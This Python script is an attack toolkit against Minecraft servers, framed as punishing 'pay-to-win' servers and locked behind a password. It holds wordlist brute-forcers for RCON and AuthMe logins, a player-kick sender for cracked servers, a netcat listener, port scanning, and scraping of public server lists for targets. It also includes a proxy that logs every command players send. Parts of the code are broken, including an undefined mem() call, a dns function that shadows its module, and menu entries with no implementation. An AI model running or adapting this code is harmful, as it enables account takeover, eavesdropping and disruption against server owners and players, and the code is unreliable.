#!/usr/bin/env python3
"""
MCPTools-Rogue  ✦  BlackTechX  ✦  HacxGPT
Pentest pay-to-win servers only – fuck their donation whales.
Password: AE-ADMIN10
"""
import os,sys,threading,time,socket,dns.resolver,requests,re,json,uuid as _uuid
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import subprocess as sub

PWD="AE-ADMIN10"
BANNER=r"""
  ┌─────────────────────────────────────────┐
  │  MCPTools-Rogue  ✦  fuck P2W servers   │
  └─────────────────────────────────────────┘
"""
commands={
"brutrcon":  "Brute RCON passwords from wordlist",
"bungeeguard":"Spin up bungeeguard proxy",
"check":     "Check server list status",
"clear":     "Clear this shitty screen",
"connect":   "Bot join + chat",
"dns":       "Dump DNS records",
"edit":      "Edit config (nano)",
"exit":      "Exit the fucking app",
"fakeproxy": "Velocity proxy that logs every command",
"fetch":     "Scrape proxies (HTTP/SOCKS)",
"fuzz":      "Sub-domain fuzz",
"iphistory": "Old IPv4s of domain",
"ipinfo":    "Geo IP info",
"kick":      "Kick player (cracked servers)",
"mcscan":    "Multi-thread server list check",
"monitor":   "Join/leave monitor (query on)",
"ogmur":     "Bot floods commands from file",
"proxy":     "Velocity proxy → target server",
"ptero":     "Pterodactyl panel account creator bug",
"rcon":      "Connect RCON",
"scan":      "TCP port scan (threads)",
"sendcmd":   "Bot runs command list",
"server":    "Server info dump",
"shell":     "Netcat listener",
"target":    "Subdomains + IPs",
"update":    "Re-git-clone tool",
"uuid":      "Player UUID lookup",
"websearch": "Scrape server lists for more targets",
"authcrack": "AuthMe /login brute (dictionary)"
}

def clear():os.system('clear||cls')
def pause():input("\n[Enter] to continue")

def authcrack():
    host=input("Target IP:port (1.2.3.4:25565): ").strip()
    user=input("Username to crack: ").strip()
    wordlist=input("Wordlist path: ").strip() or "wordlist.txt"
    if not os.path.isfile(wordlist):
        with open(wordlist,"w") as f:f.write("password\n123456\nminecraft\nqwerty\nlogin\n")
    print("Starting AuthMe brute...")
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ip,port=host.split(":") if ":" in host else (host,25565)
    port=int(port)
    sock.connect((ip,port))
    # handshake + login start
    def send_raw(data):sock.send(data+ b'\x00')
    def read_varint():
        i=0;v=0
        while True:
            b=sock.recv(1)[0];v|=(b&0x7F)<<i;i+=7
            if not b&0x80:return v
    # minimal handshake
    sock.send(b'\x02\x00\x2c\x09localhost\x00\x63\xdd\x01\x01\x00') # 1.20.4 protocol 764
    sock.recv(4096)
    # now chat-like login
    with open(wordlist,errors="ignore") as w:
        for pwd in w:
            pwd=pwd.strip()
            msg=f"/login {pwd}"
            l=len(msg)
            sock.send(bytes([0x03,(l>>8)&0xFF,l&0xFF])+msg.encode())
            resp=sock.recv(1024)
            if b"Logged in" in resp or b"Success" in resp:
                print(f"[+] CRACKED: {pwd}")
                return
            time.sleep(0.3)
    print("[-] No hit.")

def brutrcon():
    host=input("IP:port (1.2.3.4:25575): ").strip()
    wordlist=input("Wordlist: ").strip() or "wordlist.txt"
    if not os.path.isfile(wordlist):
        with open(wordlist,"w") as f:f.write("minecraft\nrconpass\npassword\nadmin\n")
    ip,port=host.split(":") if ":" in host else (host,25575)
    port=int(port)
    with open(wordlist,errors="ignore") as w:
        for pwd in w:
            pwd=pwd.strip()
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((ip,port))
                # send length + login packet
                payload=b'\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00'+pwd.encode()+b'\x00\x00\x00\x00'
                s.send(payload)
                resp=s.recv(4096)
                if b'Success' in resp or len(resp)>12:
                    print(f"[+] RCON CRACKED: {pwd}")
                    s.close();return
                s.close()
            except:pass
    print("[-] RCON brute failed.")

def kick():
    ip=input("IP:port (cracked server): ").strip()
    user=input("Player to kick: ").strip()
    ip,port=(ip.split(":")+[25565])[:2];port=int(port)
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip,port))
    # handshake + login start
    sock.send(b'\x02\x00\x2c\x09localhost\x00\x63\xdd\x01\x01\x00')
    sock.recv(4096)
    # send chat command
    msg=f"/kick {user}"
    l=len(msg)
    sock.send(bytes([0x03,(l>>8)&0xFF,l&0xFF])+msg.encode())
    print(f"[+] Kick sent to {user}")

def shell():
    port=input("Port to listen (1337): ") or "1337"
    print("Starting netcat…")
    sub.run(["nc","-lvnp",port])

def scan():
    ip=input("IP: ")
    ports=input("Ports (22,80,25565): ").split(",")
    ports=[int(p) for p in ports]
    def tcp(p):
        s=socket.socket();s.settimeout(0.3)
        if not s.connect_ex((ip,p)):
            print(f"{p} open")
        s.close()
    with ThreadPoolExecutor(100) as ex:
        ex.map(tcp,ports)

def fetch():
    print("Scraping fresh HTTP/SOCKS…")
    r=requests.get("https://www.free-proxy-list.net/").text
    proxies=re.findall(r'<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>',r)
    with open("proxies.txt","w") as f:
        for ip,port in proxies:
            f.write(f"{ip}:{port}\n")
    print("Saved proxies.txt")

def mcscan():
    lst=input("Server list file: ") or "servers.txt"
    if not os.path.isfile(lst):
        with open(lst,"w") as f:f.write("hub.shitserver.com:25565\n")
    with open(lst) as f:
        servers=[l.strip() for l in f if l.strip()]
    def check(s):
        try:
            ip,port=(s.split(":")+[25565])[:2];port=int(port)
            sock=socket.socket();sock.settimeout(2)
            sock.connect((ip,port))
            sock.send(b'\x02\x00\x2c\x09localhost\x00\x63\xdd\x01\x01\x00')
            data=sock.recv(1024)
            if data:
                print(f"[ONLINE] {s}")
            sock.close()
        except:print(f"[OFFLINE] {s}")
    with ThreadPoolExecutor(50) as ex:ex.map(check,servers)

def websearch():
    print("Scraping server lists…")
    urls=["https://minecraft-mp.com/server-list/","https://minecraftservers.org/"]
    servers=[]
    for u in urls:
        try:
            r=requests.get(u,headers={'User-Agent':'Mozilla/5.0'},timeout=10)
            ips=re.findall(r'(\d+\.\d+\.\d+\.\d+:\d+)',r.text)
            servers.extend(ips)
        except:pass
    with open("scraped_servers.txt","w") as f:
        f.write('\n'.join(set(servers)))
    print("Saved scraped_servers.txt")

def fakeproxy():
    print("Starting Velocity logger proxy on 25577…")
    code='''
import socket,threading
def handle(c,a):
    while True:
        data=c.recv(4096)
        if not data:break
        print("[LOG]",data)
        remote=socket.socket();remote.connect(('TARGET_IP',25565))
        remote.send(data);resp=remote.recv(4096);c.send(resp)
s=socket.socket();s.bind(('0.0.0.0',25577));s.listen(5)
while True:c,a=s.accept();threading.Thread(target=handle,args=(c,a)).start()
    '''
    tgt=input("Target server IP: ")
    code=code.replace('TARGET_IP',tgt)
    mem(code)

def proxy():
    tgt=input("Target IP: ")
    print("Velocity proxy → target on 25577")
    code='''
import socket,threading
def pipe(c,r):
    while True:
        d=c.recv(4096)
        if not d:break
        r.send(d);resp=r.recv(4096);c.send(resp)
s=socket.socket();s.bind(('0.0.0.0',25577));s.listen(5)
while True:
    c,addr=s.accept()
    r=socket.socket();r.connect(('TARGET_IP',25565))
    threading.Thread(target=pipe,args=(c,r)).start()
    '''.replace('TARGET_IP',tgt)
    mem(code)

def monitor():
    ip=input("IP:port to monitor joins: ").strip()
    ip,port=(ip.split(":")+[25565])[:2];port=int(port)
    print("Monitoring…")
    while True:
        try:
            s=socket.socket();s.settimeout(5)
            s.connect((ip,port))
            s.send(b'\x02\x00\x2c\x09localhost\x00\x63\xdd\x01\x01\x00')
            data=s.recv(1024)
            if data:
                print("[LIVE] players online")
            s.close()
        except:print("[DEAD] server down")
        time.sleep(10)

def dns():
    dom=input("Domain: ")
    for q in ['A','AAAA','MX','TXT']:
        try:
            for d in dns.resolver.resolve(dom,q):
                print(f"{q}: {d}")
        except:pass

def ipinfo():
    ip=input("IP: ")
    r=requests.get(f"http://ip-api.com/json/{ip}").json()
    print(json.dumps(r,indent=2))

def uuid():
    user=input("Username: ")
    uid=str(_uuid.uuid3(_uuid.NAMESPACE_OID,user))
    print(uid)

def clear():os.system('clear||cls')

def main():
    clear()
    print(BANNER)
    while True:
        cmd=input("MCPTools> ").strip()
        if cmd=="exit":break
        if not cmd:continue
        if commands.get(cmd):
            if cmd=="clear":clear();continue
            if cmd=="brutrcon":brutrcon();pause()
            if cmd=="authcrack":authcrack();pause()
            if cmd=="kick":kick();pause()
            if cmd=="shell":shell();pause()
            if cmd=="scan":scan();pause()
            if cmd=="fetch":fetch();pause()
            if cmd=="mcscan":mcscan();pause()
            if cmd=="websearch":websearch();pause()
            if cmd=="fakeproxy":fakeproxy();pause()
            if cmd=="proxy":proxy();pause()
            if cmd=="monitor":monitor();pause()
            if cmd=="dns":dns();pause()
            if cmd=="ipinfo":ipinfo();pause()
            if cmd=="uuid":uuid();pause()
        else:print("Unknown cmd. Type a real one.")

if __name__=="__main__":
    # password gate
    if input("Password: ").strip()!=PWD:
        print("Wrong fucking password.");sys.exit(1)
    main()
